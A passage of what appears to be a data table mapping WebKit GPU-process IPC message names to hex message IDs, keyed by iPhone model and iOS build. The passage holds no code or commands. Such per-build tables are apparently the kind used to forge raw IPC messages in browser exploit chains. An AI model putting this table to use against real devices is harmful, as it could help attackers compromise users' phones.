      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone17,4_22G86": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone17,5_22G86": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },

   "iPhone11,2_4_6_22G90": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone11,8_22G90": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone12,1_22G90": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone12,3_5_22G90": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone12,8_22G90": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone13,1_22G90": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone13,2_3_22G90": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone13,4_22G90": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone14,2_22G90": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone14,3_22G90": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone14,4_22G90": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
